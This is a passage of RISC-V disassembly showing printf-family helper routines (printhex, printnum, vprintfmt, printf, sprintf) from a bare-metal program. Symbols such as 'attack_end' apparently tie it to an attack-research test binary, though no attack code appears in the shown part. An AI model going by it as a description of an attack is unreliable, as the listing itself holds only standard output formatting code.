    800077b8:	00d7e663          	bltu	a5,a3,800077c4 <printhex+0x44>
    800077bc:	03000793          	li	a5,48
    800077c0:	0080006f          	j	800077c8 <printhex+0x48>
    800077c4:	05700793          	li	a5,87
    800077c8:	00f00693          	li	a3,15
    800077cc:	fec42603          	lw	a2,-20(s0)
    800077d0:	40c686bb          	subw	a3,a3,a2
    800077d4:	0006869b          	sext.w	a3,a3
    800077d8:	00e787bb          	addw	a5,a5,a4
    800077dc:	0ff7f713          	zext.b	a4,a5
    800077e0:	ff068793          	add	a5,a3,-16
    800077e4:	008787b3          	add	a5,a5,s0
    800077e8:	fee78423          	sb	a4,-24(a5)
    800077ec:	fc843783          	ld	a5,-56(s0)
    800077f0:	0047d793          	srl	a5,a5,0x4
    800077f4:	fcf43423          	sd	a5,-56(s0)
    800077f8:	fec42783          	lw	a5,-20(s0)
    800077fc:	0017879b          	addw	a5,a5,1
    80007800:	fef42623          	sw	a5,-20(s0)
    80007804:	fec42783          	lw	a5,-20(s0)
    80007808:	0007871b          	sext.w	a4,a5
    8000780c:	00f00793          	li	a5,15
    80007810:	f8e7d6e3          	bge	a5,a4,8000779c <printhex+0x1c>
    80007814:	fe040423          	sb	zero,-24(s0)
    80007818:	fd840793          	add	a5,s0,-40
    8000781c:	00078513          	mv	a0,a5
    80007820:	e79ff0ef          	jal	80007698 <printstr>
    80007824:	00000013          	nop
    80007828:	03813083          	ld	ra,56(sp)
    8000782c:	03013403          	ld	s0,48(sp)
    80007830:	04010113          	add	sp,sp,64
    80007834:	00008067          	ret

0000000080007838 <printnum>:
    80007838:	eb010113          	add	sp,sp,-336
    8000783c:	14113423          	sd	ra,328(sp)
    80007840:	14813023          	sd	s0,320(sp)
    80007844:	15010413          	add	s0,sp,336
    80007848:	eca43c23          	sd	a0,-296(s0)
    8000784c:	ecb43823          	sd	a1,-304(s0)
    80007850:	ecc43423          	sd	a2,-312(s0)
    80007854:	00068613          	mv	a2,a3
    80007858:	00070693          	mv	a3,a4
    8000785c:	00078713          	mv	a4,a5
    80007860:	00060793          	mv	a5,a2
    80007864:	ecf42223          	sw	a5,-316(s0)
    80007868:	00068793          	mv	a5,a3
    8000786c:	ecf42023          	sw	a5,-320(s0)
    80007870:	00070793          	mv	a5,a4
    80007874:	eaf42e23          	sw	a5,-324(s0)
    80007878:	fe042623          	sw	zero,-20(s0)
    8000787c:	ec446783          	lwu	a5,-316(s0)
    80007880:	ec843703          	ld	a4,-312(s0)
    80007884:	02f776b3          	remu	a3,a4,a5
    80007888:	fec42783          	lw	a5,-20(s0)
    8000788c:	0017871b          	addw	a4,a5,1
    80007890:	fee42623          	sw	a4,-20(s0)
    80007894:	0006871b          	sext.w	a4,a3
    80007898:	00279793          	sll	a5,a5,0x2
    8000789c:	ff078793          	add	a5,a5,-16
    800078a0:	008787b3          	add	a5,a5,s0
    800078a4:	eee7ac23          	sw	a4,-264(a5)
    800078a8:	ec446783          	lwu	a5,-316(s0)
    800078ac:	ec843703          	ld	a4,-312(s0)
    800078b0:	00f76c63          	bltu	a4,a5,800078c8 <printnum+0x90>
    800078b4:	ec446783          	lwu	a5,-316(s0)
    800078b8:	ec843703          	ld	a4,-312(s0)
    800078bc:	02f757b3          	divu	a5,a4,a5
    800078c0:	ecf43423          	sd	a5,-312(s0)
    800078c4:	fb9ff06f          	j	8000787c <printnum+0x44>
    800078c8:	00000013          	nop
    800078cc:	0180006f          	j	800078e4 <printnum+0xac>
    800078d0:	ebc42703          	lw	a4,-324(s0)
    800078d4:	ed843783          	ld	a5,-296(s0)
    800078d8:	ed043583          	ld	a1,-304(s0)
    800078dc:	00070513          	mv	a0,a4
    800078e0:	000780e7          	jalr	a5
    800078e4:	ec042783          	lw	a5,-320(s0)
    800078e8:	fff7871b          	addw	a4,a5,-1
    800078ec:	ece42023          	sw	a4,-320(s0)
    800078f0:	fec42703          	lw	a4,-20(s0)
    800078f4:	0007071b          	sext.w	a4,a4
    800078f8:	fcf74ce3          	blt	a4,a5,800078d0 <printnum+0x98>
    800078fc:	0600006f          	j	8000795c <printnum+0x124>
    80007900:	fec42783          	lw	a5,-20(s0)
    80007904:	00279793          	sll	a5,a5,0x2
    80007908:	ff078793          	add	a5,a5,-16
    8000790c:	008787b3          	add	a5,a5,s0
    80007910:	ef87a703          	lw	a4,-264(a5)
    80007914:	fec42783          	lw	a5,-20(s0)
    80007918:	00279793          	sll	a5,a5,0x2
    8000791c:	ff078793          	add	a5,a5,-16
    80007920:	008787b3          	add	a5,a5,s0
    80007924:	ef87a783          	lw	a5,-264(a5)
    80007928:	00078693          	mv	a3,a5
    8000792c:	00900793          	li	a5,9
    80007930:	00d7f663          	bgeu	a5,a3,8000793c <printnum+0x104>
    80007934:	05700793          	li	a5,87
    80007938:	0080006f          	j	80007940 <printnum+0x108>
    8000793c:	03000793          	li	a5,48
    80007940:	00e787bb          	addw	a5,a5,a4
    80007944:	0007879b          	sext.w	a5,a5
    80007948:	0007871b          	sext.w	a4,a5
    8000794c:	ed843783          	ld	a5,-296(s0)
    80007950:	ed043583          	ld	a1,-304(s0)
    80007954:	00070513          	mv	a0,a4
    80007958:	000780e7          	jalr	a5
    8000795c:	fec42783          	lw	a5,-20(s0)
    80007960:	fff7871b          	addw	a4,a5,-1
    80007964:	fee42623          	sw	a4,-20(s0)
    80007968:	f8f04ce3          	bgtz	a5,80007900 <printnum+0xc8>
    8000796c:	00000013          	nop
    80007970:	00000013          	nop
    80007974:	14813083          	ld	ra,328(sp)
    80007978:	14013403          	ld	s0,320(sp)
    8000797c:	15010113          	add	sp,sp,336
    80007980:	00008067          	ret

0000000080007984 <getuint>:
    80007984:	fe010113          	add	sp,sp,-32
    80007988:	00813c23          	sd	s0,24(sp)
    8000798c:	02010413          	add	s0,sp,32
    80007990:	fea43423          	sd	a0,-24(s0)
    80007994:	00058793          	mv	a5,a1
    80007998:	fef42223          	sw	a5,-28(s0)
    8000799c:	fe442783          	lw	a5,-28(s0)
    800079a0:	0007871b          	sext.w	a4,a5
    800079a4:	00100793          	li	a5,1
    800079a8:	02e7d063          	bge	a5,a4,800079c8 <getuint+0x44>
    800079ac:	fe843783          	ld	a5,-24(s0)
    800079b0:	0007b783          	ld	a5,0(a5)
    800079b4:	00878693          	add	a3,a5,8
    800079b8:	fe843703          	ld	a4,-24(s0)
    800079bc:	00d73023          	sd	a3,0(a4)
    800079c0:	0007b783          	ld	a5,0(a5)
    800079c4:	04c0006f          	j	80007a10 <getuint+0x8c>
    800079c8:	fe442783          	lw	a5,-28(s0)
    800079cc:	0007879b          	sext.w	a5,a5
    800079d0:	02078063          	beqz	a5,800079f0 <getuint+0x6c>
    800079d4:	fe843783          	ld	a5,-24(s0)
    800079d8:	0007b783          	ld	a5,0(a5)
    800079dc:	00878693          	add	a3,a5,8
    800079e0:	fe843703          	ld	a4,-24(s0)
    800079e4:	00d73023          	sd	a3,0(a4)
    800079e8:	0007b783          	ld	a5,0(a5)
    800079ec:	0240006f          	j	80007a10 <getuint+0x8c>
    800079f0:	fe843783          	ld	a5,-24(s0)
    800079f4:	0007b783          	ld	a5,0(a5)
    800079f8:	00878693          	add	a3,a5,8
    800079fc:	fe843703          	ld	a4,-24(s0)
    80007a00:	00d73023          	sd	a3,0(a4)
    80007a04:	0007a783          	lw	a5,0(a5)
    80007a08:	02079793          	sll	a5,a5,0x20
    80007a0c:	0207d793          	srl	a5,a5,0x20
    80007a10:	00078513          	mv	a0,a5
    80007a14:	01813403          	ld	s0,24(sp)
    80007a18:	02010113          	add	sp,sp,32
    80007a1c:	00008067          	ret

0000000080007a20 <getint>:
    80007a20:	fe010113          	add	sp,sp,-32
    80007a24:	00813c23          	sd	s0,24(sp)
    80007a28:	02010413          	add	s0,sp,32
    80007a2c:	fea43423          	sd	a0,-24(s0)
    80007a30:	00058793          	mv	a5,a1
    80007a34:	fef42223          	sw	a5,-28(s0)
    80007a38:	fe442783          	lw	a5,-28(s0)
    80007a3c:	0007871b          	sext.w	a4,a5
    80007a40:	00100793          	li	a5,1
    80007a44:	02e7d063          	bge	a5,a4,80007a64 <getint+0x44>
    80007a48:	fe843783          	ld	a5,-24(s0)
    80007a4c:	0007b783          	ld	a5,0(a5)
    80007a50:	00878693          	add	a3,a5,8
    80007a54:	fe843703          	ld	a4,-24(s0)
    80007a58:	00d73023          	sd	a3,0(a4)
    80007a5c:	0007b783          	ld	a5,0(a5)
    80007a60:	0440006f          	j	80007aa4 <getint+0x84>
    80007a64:	fe442783          	lw	a5,-28(s0)
    80007a68:	0007879b          	sext.w	a5,a5
    80007a6c:	02078063          	beqz	a5,80007a8c <getint+0x6c>
    80007a70:	fe843783          	ld	a5,-24(s0)
    80007a74:	0007b783          	ld	a5,0(a5)
    80007a78:	00878693          	add	a3,a5,8
    80007a7c:	fe843703          	ld	a4,-24(s0)
    80007a80:	00d73023          	sd	a3,0(a4)
    80007a84:	0007b783          	ld	a5,0(a5)
    80007a88:	01c0006f          	j	80007aa4 <getint+0x84>
    80007a8c:	fe843783          	ld	a5,-24(s0)
    80007a90:	0007b783          	ld	a5,0(a5)
    80007a94:	00878693          	add	a3,a5,8
    80007a98:	fe843703          	ld	a4,-24(s0)
    80007a9c:	00d73023          	sd	a3,0(a4)
    80007aa0:	0007a783          	lw	a5,0(a5)
    80007aa4:	00078513          	mv	a0,a5
    80007aa8:	01813403          	ld	s0,24(sp)
    80007aac:	02010113          	add	sp,sp,32
    80007ab0:	00008067          	ret

0000000080007ab4 <vprintfmt>:
    80007ab4:	f9010113          	add	sp,sp,-112
    80007ab8:	06113423          	sd	ra,104(sp)
    80007abc:	06813023          	sd	s0,96(sp)
    80007ac0:	04913c23          	sd	s1,88(sp)
    80007ac4:	05213823          	sd	s2,80(sp)
    80007ac8:	07010413          	add	s0,sp,112
    80007acc:	faa43423          	sd	a0,-88(s0)
    80007ad0:	fab43023          	sd	a1,-96(s0)
    80007ad4:	f8c43c23          	sd	a2,-104(s0)
    80007ad8:	f8d43823          	sd	a3,-112(s0)
    80007adc:	0240006f          	j	80007b00 <vprintfmt+0x4c>
    80007ae0:	3e048c63          	beqz	s1,80007ed8 <vprintfmt+0x424>
    80007ae4:	f9843783          	ld	a5,-104(s0)
    80007ae8:	00178793          	add	a5,a5,1
    80007aec:	f8f43c23          	sd	a5,-104(s0)
    80007af0:	fa843783          	ld	a5,-88(s0)
    80007af4:	fa043583          	ld	a1,-96(s0)
    80007af8:	00048513          	mv	a0,s1
    80007afc:	000780e7          	jalr	a5
    80007b00:	f9843783          	ld	a5,-104(s0)
    80007b04:	0007c783          	lbu	a5,0(a5)
    80007b08:	0007849b          	sext.w	s1,a5
    80007b0c:	00048713          	mv	a4,s1
    80007b10:	02500793          	li	a5,37
    80007b14:	fcf716e3          	bne	a4,a5,80007ae0 <vprintfmt+0x2c>
    80007b18:	f9843783          	ld	a5,-104(s0)
    80007b1c:	00178793          	add	a5,a5,1
    80007b20:	f8f43c23          	sd	a5,-104(s0)
    80007b24:	f9843783          	ld	a5,-104(s0)
    80007b28:	faf43c23          	sd	a5,-72(s0)
    80007b2c:	02000793          	li	a5,32
    80007b30:	fcf403a3          	sb	a5,-57(s0)
    80007b34:	fff00793          	li	a5,-1
    80007b38:	fcf42623          	sw	a5,-52(s0)
    80007b3c:	fff00793          	li	a5,-1
    80007b40:	fcf42423          	sw	a5,-56(s0)
    80007b44:	fc042823          	sw	zero,-48(s0)
    80007b48:	fa042a23          	sw	zero,-76(s0)
    80007b4c:	0100006f          	j	80007b5c <vprintfmt+0xa8>
    80007b50:	00000013          	nop
    80007b54:	0080006f          	j	80007b5c <vprintfmt+0xa8>
    80007b58:	00000013          	nop
    80007b5c:	f9843783          	ld	a5,-104(s0)
    80007b60:	00178713          	add	a4,a5,1
    80007b64:	f8e43c23          	sd	a4,-104(s0)
    80007b68:	0007c783          	lbu	a5,0(a5)
    80007b6c:	0007849b          	sext.w	s1,a5
    80007b70:	fdd4869b          	addw	a3,s1,-35
    80007b74:	0006871b          	sext.w	a4,a3
    80007b78:	05500793          	li	a5,85
    80007b7c:	32e7ee63          	bltu	a5,a4,80007eb8 <vprintfmt+0x404>
    80007b80:	02069793          	sll	a5,a3,0x20
    80007b84:	0207d793          	srl	a5,a5,0x20
    80007b88:	00279713          	sll	a4,a5,0x2
    80007b8c:	001f8797          	auipc	a5,0x1f8
    80007b90:	49478793          	add	a5,a5,1172 # 80200020 <attack_end+0x18>
    80007b94:	00f707b3          	add	a5,a4,a5
    80007b98:	0007a783          	lw	a5,0(a5)
    80007b9c:	0007871b          	sext.w	a4,a5
    80007ba0:	001f8797          	auipc	a5,0x1f8
    80007ba4:	48078793          	add	a5,a5,1152 # 80200020 <attack_end+0x18>
    80007ba8:	00f707b3          	add	a5,a4,a5
    80007bac:	00078067          	jr	a5
    80007bb0:	02d00793          	li	a5,45
    80007bb4:	fcf403a3          	sb	a5,-57(s0)
    80007bb8:	fa5ff06f          	j	80007b5c <vprintfmt+0xa8>
    80007bbc:	03000793          	li	a5,48
    80007bc0:	fcf403a3          	sb	a5,-57(s0)
    80007bc4:	f99ff06f          	j	80007b5c <vprintfmt+0xa8>
    80007bc8:	fc042423          	sw	zero,-56(s0)
    80007bcc:	fc842783          	lw	a5,-56(s0)
    80007bd0:	00078713          	mv	a4,a5
    80007bd4:	00070793          	mv	a5,a4
    80007bd8:	0027979b          	sllw	a5,a5,0x2
    80007bdc:	00e787bb          	addw	a5,a5,a4
    80007be0:	0017979b          	sllw	a5,a5,0x1
    80007be4:	0007879b          	sext.w	a5,a5
    80007be8:	00f487bb          	addw	a5,s1,a5
    80007bec:	0007879b          	sext.w	a5,a5
    80007bf0:	fd07879b          	addw	a5,a5,-48
    80007bf4:	fcf42423          	sw	a5,-56(s0)
    80007bf8:	f9843783          	ld	a5,-104(s0)
    80007bfc:	0007c783          	lbu	a5,0(a5)
    80007c00:	0007849b          	sext.w	s1,a5
    80007c04:	00048713          	mv	a4,s1
    80007c08:	02f00793          	li	a5,47
    80007c0c:	04e7dc63          	bge	a5,a4,80007c64 <vprintfmt+0x1b0>
    80007c10:	00048713          	mv	a4,s1
    80007c14:	03900793          	li	a5,57
    80007c18:	04e7c663          	blt	a5,a4,80007c64 <vprintfmt+0x1b0>
    80007c1c:	f9843783          	ld	a5,-104(s0)
    80007c20:	00178793          	add	a5,a5,1
    80007c24:	f8f43c23          	sd	a5,-104(s0)
    80007c28:	fa5ff06f          	j	80007bcc <vprintfmt+0x118>
    80007c2c:	f9043783          	ld	a5,-112(s0)
    80007c30:	00878713          	add	a4,a5,8
    80007c34:	f8e43823          	sd	a4,-112(s0)
    80007c38:	0007a783          	lw	a5,0(a5)
    80007c3c:	fcf42423          	sw	a5,-56(s0)
    80007c40:	0280006f          	j	80007c68 <vprintfmt+0x1b4>
    80007c44:	fcc42783          	lw	a5,-52(s0)
    80007c48:	0007879b          	sext.w	a5,a5
    80007c4c:	f007d2e3          	bgez	a5,80007b50 <vprintfmt+0x9c>
    80007c50:	fc042623          	sw	zero,-52(s0)
    80007c54:	efdff06f          	j	80007b50 <vprintfmt+0x9c>
    80007c58:	00100793          	li	a5,1
    80007c5c:	faf42a23          	sw	a5,-76(s0)
    80007c60:	efdff06f          	j	80007b5c <vprintfmt+0xa8>
    80007c64:	00000013          	nop
    80007c68:	fcc42783          	lw	a5,-52(s0)
    80007c6c:	0007879b          	sext.w	a5,a5
    80007c70:	ee07d4e3          	bgez	a5,80007b58 <vprintfmt+0xa4>
    80007c74:	fc842783          	lw	a5,-56(s0)
    80007c78:	fcf42623          	sw	a5,-52(s0)
    80007c7c:	fff00793          	li	a5,-1
    80007c80:	fcf42423          	sw	a5,-56(s0)
    80007c84:	ed5ff06f          	j	80007b58 <vprintfmt+0xa4>
    80007c88:	fd042783          	lw	a5,-48(s0)
    80007c8c:	0017879b          	addw	a5,a5,1
    80007c90:	fcf42823          	sw	a5,-48(s0)
    80007c94:	ec9ff06f          	j	80007b5c <vprintfmt+0xa8>
    80007c98:	f9043783          	ld	a5,-112(s0)
    80007c9c:	00878713          	add	a4,a5,8
    80007ca0:	f8e43823          	sd	a4,-112(s0)
    80007ca4:	0007a703          	lw	a4,0(a5)
    80007ca8:	fa843783          	ld	a5,-88(s0)
    80007cac:	fa043583          	ld	a1,-96(s0)
    80007cb0:	00070513          	mv	a0,a4
    80007cb4:	000780e7          	jalr	a5
    80007cb8:	21c0006f          	j	80007ed4 <vprintfmt+0x420>
    80007cbc:	f9043783          	ld	a5,-112(s0)
    80007cc0:	00878713          	add	a4,a5,8
    80007cc4:	f8e43823          	sd	a4,-112(s0)
    80007cc8:	0007b903          	ld	s2,0(a5)
    80007ccc:	00091663          	bnez	s2,80007cd8 <vprintfmt+0x224>
    80007cd0:	001f8917          	auipc	s2,0x1f8
    80007cd4:	34890913          	add	s2,s2,840 # 80200018 <attack_end+0x10>
    80007cd8:	fcc42783          	lw	a5,-52(s0)
    80007cdc:	0007879b          	sext.w	a5,a5
    80007ce0:	08f05a63          	blez	a5,80007d74 <vprintfmt+0x2c0>
    80007ce4:	fc744783          	lbu	a5,-57(s0)
    80007ce8:	0ff7f713          	zext.b	a4,a5
    80007cec:	02d00793          	li	a5,45
    80007cf0:	08f70263          	beq	a4,a5,80007d74 <vprintfmt+0x2c0>
    80007cf4:	fcc42483          	lw	s1,-52(s0)
    80007cf8:	fc842783          	lw	a5,-56(s0)
    80007cfc:	00078593          	mv	a1,a5
    80007d00:	00090513          	mv	a0,s2
    80007d04:	5dc000ef          	jal	800082e0 <strnlen>
    80007d08:	00050793          	mv	a5,a0
    80007d0c:	0007879b          	sext.w	a5,a5
    80007d10:	40f487bb          	subw	a5,s1,a5
    80007d14:	0007879b          	sext.w	a5,a5
    80007d18:	fcf42623          	sw	a5,-52(s0)
    80007d1c:	0280006f          	j	80007d44 <vprintfmt+0x290>
    80007d20:	fc744783          	lbu	a5,-57(s0)
    80007d24:	0007871b          	sext.w	a4,a5
    80007d28:	fa843783          	ld	a5,-88(s0)
    80007d2c:	fa043583          	ld	a1,-96(s0)
    80007d30:	00070513          	mv	a0,a4
    80007d34:	000780e7          	jalr	a5
    80007d38:	fcc42783          	lw	a5,-52(s0)
    80007d3c:	fff7879b          	addw	a5,a5,-1
    80007d40:	fcf42623          	sw	a5,-52(s0)
    80007d44:	fcc42783          	lw	a5,-52(s0)
    80007d48:	0007879b          	sext.w	a5,a5
    80007d4c:	fcf04ae3          	bgtz	a5,80007d20 <vprintfmt+0x26c>
    80007d50:	0240006f          	j	80007d74 <vprintfmt+0x2c0>
    80007d54:	fa843783          	ld	a5,-88(s0)
    80007d58:	fa043583          	ld	a1,-96(s0)
    80007d5c:	00048513          	mv	a0,s1
    80007d60:	000780e7          	jalr	a5
    80007d64:	00190913          	add	s2,s2,1
    80007d68:	fcc42783          	lw	a5,-52(s0)
    80007d6c:	fff7879b          	addw	a5,a5,-1
    80007d70:	fcf42623          	sw	a5,-52(s0)
    80007d74:	00094783          	lbu	a5,0(s2)
    80007d78:	0007849b          	sext.w	s1,a5
    80007d7c:	04048463          	beqz	s1,80007dc4 <vprintfmt+0x310>
    80007d80:	fc842783          	lw	a5,-56(s0)
    80007d84:	0007879b          	sext.w	a5,a5
    80007d88:	fc07c6e3          	bltz	a5,80007d54 <vprintfmt+0x2a0>
    80007d8c:	fc842783          	lw	a5,-56(s0)
    80007d90:	fff7879b          	addw	a5,a5,-1
    80007d94:	fcf42423          	sw	a5,-56(s0)
    80007d98:	fc842783          	lw	a5,-56(s0)
    80007d9c:	0007879b          	sext.w	a5,a5
    80007da0:	fa07dae3          	bgez	a5,80007d54 <vprintfmt+0x2a0>
    80007da4:	0200006f          	j	80007dc4 <vprintfmt+0x310>
    80007da8:	fa843783          	ld	a5,-88(s0)
    80007dac:	fa043583          	ld	a1,-96(s0)
    80007db0:	02000513          	li	a0,32
    80007db4:	000780e7          	jalr	a5
    80007db8:	fcc42783          	lw	a5,-52(s0)
    80007dbc:	fff7879b          	addw	a5,a5,-1
    80007dc0:	fcf42623          	sw	a5,-52(s0)
    80007dc4:	fcc42783          	lw	a5,-52(s0)
    80007dc8:	0007879b          	sext.w	a5,a5
    80007dcc:	fcf04ee3          	bgtz	a5,80007da8 <vprintfmt+0x2f4>
    80007dd0:	1040006f          	j	80007ed4 <vprintfmt+0x420>
    80007dd4:	fd042703          	lw	a4,-48(s0)
    80007dd8:	f9040793          	add	a5,s0,-112
    80007ddc:	00070593          	mv	a1,a4
    80007de0:	00078513          	mv	a0,a5
    80007de4:	c3dff0ef          	jal	80007a20 <getint>
    80007de8:	00050793          	mv	a5,a0
    80007dec:	fcf43c23          	sd	a5,-40(s0)
    80007df0:	fd843783          	ld	a5,-40(s0)
    80007df4:	0207d063          	bgez	a5,80007e14 <vprintfmt+0x360>
    80007df8:	fa843783          	ld	a5,-88(s0)
    80007dfc:	fa043583          	ld	a1,-96(s0)
    80007e00:	02d00513          	li	a0,45
    80007e04:	000780e7          	jalr	a5
    80007e08:	fd843783          	ld	a5,-40(s0)
    80007e0c:	40f007b3          	neg	a5,a5
    80007e10:	fcf43c23          	sd	a5,-40(s0)
    80007e14:	00a00793          	li	a5,10
    80007e18:	fcf42a23          	sw	a5,-44(s0)
    80007e1c:	0640006f          	j	80007e80 <vprintfmt+0x3cc>
    80007e20:	00a00793          	li	a5,10
    80007e24:	fcf42a23          	sw	a5,-44(s0)
    80007e28:	0400006f          	j	80007e68 <vprintfmt+0x3b4>
    80007e2c:	00800793          	li	a5,8
    80007e30:	fcf42a23          	sw	a5,-44(s0)
    80007e34:	0340006f          	j	80007e68 <vprintfmt+0x3b4>
    80007e38:	00100793          	li	a5,1
    80007e3c:	fcf42823          	sw	a5,-48(s0)
    80007e40:	fa843783          	ld	a5,-88(s0)
    80007e44:	fa043583          	ld	a1,-96(s0)
    80007e48:	03000513          	li	a0,48
    80007e4c:	000780e7          	jalr	a5
    80007e50:	fa843783          	ld	a5,-88(s0)
    80007e54:	fa043583          	ld	a1,-96(s0)
    80007e58:	07800513          	li	a0,120
    80007e5c:	000780e7          	jalr	a5
    80007e60:	01000793          	li	a5,16
    80007e64:	fcf42a23          	sw	a5,-44(s0)
    80007e68:	fd042703          	lw	a4,-48(s0)
    80007e6c:	f9040793          	add	a5,s0,-112
    80007e70:	00070593          	mv	a1,a4
    80007e74:	00078513          	mv	a0,a5
    80007e78:	b0dff0ef          	jal	80007984 <getuint>
    80007e7c:	fca43c23          	sd	a0,-40(s0)
    80007e80:	fd442683          	lw	a3,-44(s0)
    80007e84:	fc744783          	lbu	a5,-57(s0)
    80007e88:	0007879b          	sext.w	a5,a5
    80007e8c:	fcc42703          	lw	a4,-52(s0)
    80007e90:	fd843603          	ld	a2,-40(s0)
    80007e94:	fa043583          	ld	a1,-96(s0)
    80007e98:	fa843503          	ld	a0,-88(s0)
    80007e9c:	99dff0ef          	jal	80007838 <printnum>
    80007ea0:	0340006f          	j	80007ed4 <vprintfmt+0x420>
    80007ea4:	fa843783          	ld	a5,-88(s0)
    80007ea8:	fa043583          	ld	a1,-96(s0)
    80007eac:	00048513          	mv	a0,s1
    80007eb0:	000780e7          	jalr	a5
    80007eb4:	0200006f          	j	80007ed4 <vprintfmt+0x420>
    80007eb8:	fa843783          	ld	a5,-88(s0)
    80007ebc:	fa043583          	ld	a1,-96(s0)
    80007ec0:	02500513          	li	a0,37
    80007ec4:	000780e7          	jalr	a5
    80007ec8:	fb843783          	ld	a5,-72(s0)
    80007ecc:	f8f43c23          	sd	a5,-104(s0)
    80007ed0:	00000013          	nop
    80007ed4:	c2dff06f          	j	80007b00 <vprintfmt+0x4c>
    80007ed8:	00000013          	nop
    80007edc:	06813083          	ld	ra,104(sp)
    80007ee0:	06013403          	ld	s0,96(sp)
    80007ee4:	05813483          	ld	s1,88(sp)
    80007ee8:	05013903          	ld	s2,80(sp)
    80007eec:	07010113          	add	sp,sp,112
    80007ef0:	00008067          	ret

0000000080007ef4 <printf>:
    80007ef4:	f9010113          	add	sp,sp,-112
    80007ef8:	02113423          	sd	ra,40(sp)
    80007efc:	02813023          	sd	s0,32(sp)
    80007f00:	03010413          	add	s0,sp,48
    80007f04:	fca43c23          	sd	a0,-40(s0)
    80007f08:	00b43423          	sd	a1,8(s0)
    80007f0c:	00c43823          	sd	a2,16(s0)
    80007f10:	00d43c23          	sd	a3,24(s0)
    80007f14:	02e43023          	sd	a4,32(s0)
    80007f18:	02f43423          	sd	a5,40(s0)
    80007f1c:	03043823          	sd	a6,48(s0)
    80007f20:	03143c23          	sd	a7,56(s0)
    80007f24:	04040793          	add	a5,s0,64
    80007f28:	fcf43823          	sd	a5,-48(s0)
    80007f2c:	fd043783          	ld	a5,-48(s0)
    80007f30:	fc878793          	add	a5,a5,-56
    80007f34:	fef43423          	sd	a5,-24(s0)
    80007f38:	fe843783          	ld	a5,-24(s0)
    80007f3c:	00078693          	mv	a3,a5
    80007f40:	fd843603          	ld	a2,-40(s0)
    80007f44:	00000593          	li	a1,0
    80007f48:	fffff517          	auipc	a0,0xfffff
    80007f4c:	7a450513          	add	a0,a0,1956 # 800076ec <putchar>
    80007f50:	b65ff0ef          	jal	80007ab4 <vprintfmt>
    80007f54:	00000793          	li	a5,0
    80007f58:	00078513          	mv	a0,a5
    80007f5c:	02813083          	ld	ra,40(sp)
    80007f60:	02013403          	ld	s0,32(sp)
    80007f64:	07010113          	add	sp,sp,112
    80007f68:	00008067          	ret

0000000080007f6c <sprintf_putch.0>:
    80007f6c:	fc010113          	add	sp,sp,-64
    80007f70:	02813c23          	sd	s0,56(sp)
    80007f74:	04010413          	add	s0,sp,64
    80007f78:	00050793          	mv	a5,a0
    80007f7c:	fcb43823          	sd	a1,-48(s0)
    80007f80:	fcf42e23          	sw	a5,-36(s0)
    80007f84:	fc743423          	sd	t2,-56(s0)
    80007f88:	fd043783          	ld	a5,-48(s0)
    80007f8c:	fef43423          	sd	a5,-24(s0)
    80007f90:	fe843783          	ld	a5,-24(s0)
    80007f94:	0007b783          	ld	a5,0(a5)
    80007f98:	fdc42703          	lw	a4,-36(s0)
    80007f9c:	0ff77713          	zext.b	a4,a4
    80007fa0:	00e78023          	sb	a4,0(a5)
    80007fa4:	fe843783          	ld	a5,-24(s0)
    80007fa8:	0007b783          	ld	a5,0(a5)
    80007fac:	00178713          	add	a4,a5,1
    80007fb0:	fe843783          	ld	a5,-24(s0)
    80007fb4:	00e7b023          	sd	a4,0(a5)
    80007fb8:	00000013          	nop
    80007fbc:	03813403          	ld	s0,56(sp)
    80007fc0:	04010113          	add	sp,sp,64
    80007fc4:	00008067          	ret

0000000080007fc8 <sprintf>:
    80007fc8:	ef010113          	add	sp,sp,-272
    80007fcc:	0c113c23          	sd	ra,216(sp)
    80007fd0:	0c813823          	sd	s0,208(sp)
    80007fd4:	0e010413          	add	s0,sp,224
    80007fd8:	f2a43c23          	sd	a0,-200(s0)
    80007fdc:	f2b43823          	sd	a1,-208(s0)
    80007fe0:	00c43023          	sd	a2,0(s0)
    80007fe4:	00d43423          	sd	a3,8(s0)
    80007fe8:	00e43823          	sd	a4,16(s0)
    80007fec:	00f43c23          	sd	a5,24(s0)
    80007ff0:	03043023          	sd	a6,32(s0)
    80007ff4:	03143423          	sd	a7,40(s0)
    80007ff8:	03040793          	add	a5,s0,48
    80007ffc:	f2f43423          	sd	a5,-216(s0)
    80008000:	f2843783          	ld	a5,-216(s0)
    80008004:	fcf43c23          	sd	a5,-40(s0)
    80008008:	f4840793          	add	a5,s0,-184
    8000800c:	f4840713          	add	a4,s0,-184
    80008010:	39700693          	li	a3,919
    80008014:	00d7a023          	sw	a3,0(a5)
    80008018:	0183b6b7          	lui	a3,0x183b
    8000801c:	28368693          	add	a3,a3,643 # 183b283 <threadsense.2+0x183b1ff>
    80008020:	00d7a223          	sw	a3,4(a5)
    80008024:	0103b6b7          	lui	a3,0x103b
    80008028:	38368693          	add	a3,a3,899 # 103b383 <threadsense.2+0x103b2ff>
    8000802c:	00d7a423          	sw	a3,8(a5)
    80008030:	000286b7          	lui	a3,0x28
    80008034:	06768693          	add	a3,a3,103 # 28067 <threadsense.2+0x27fe3>
    80008038:	00d7a623          	sw	a3,12(a5)
    8000803c:	00e7b823          	sd	a4,16(a5)
    80008040:	00000717          	auipc	a4,0x0
    80008044:	f2c70713          	add	a4,a4,-212 # 80007f6c <sprintf_putch.0>
    80008048:	00e7bc23          	sd	a4,24(a5)
    8000804c:	0000100f          	fence.i
    80008050:	f3843783          	ld	a5,-200(s0)
    80008054:	fef43423          	sd	a5,-24(s0)
    80008058:	03040793          	add	a5,s0,48
    8000805c:	f2f43423          	sd	a5,-216(s0)
    80008060:	f2843783          	ld	a5,-216(s0)
    80008064:	fd078793          	add	a5,a5,-48
    80008068:	fef43023          	sd	a5,-32(s0)
    8000806c:	fe043703          	ld	a4,-32(s0)
    80008070:	f4840793          	add	a5,s0,-184
    80008074:	00078513          	mv	a0,a5
    80008078:	f3840793          	add	a5,s0,-200
    8000807c:	00070693          	mv	a3,a4
    80008080:	f3043603          	ld	a2,-208(s0)
    80008084:	00078593          	mv	a1,a5
    80008088:	a2dff0ef          	jal	80007ab4 <vprintfmt>
    8000808c:	f3843783          	ld	a5,-200(s0)
    80008090:	00078023          	sb	zero,0(a5)
    80008094:	f3843703          	ld	a4,-200(s0)
    80008098:	fe843783          	ld	a5,-24(s0)
    8000809c:	40f707b3          	sub	a5,a4,a5
    800080a0:	0007879b          	sext.w	a5,a5
    800080a4:	00078513          	mv	a0,a5
    800080a8:	0d813083          	ld	ra,216(sp)
    800080ac:	0d013403          	ld	s0,208(sp)
    800080b0:	11010113          	add	sp,sp,272
    800080b4:	00008067          	ret

00000000800080b8 <memcpy>:
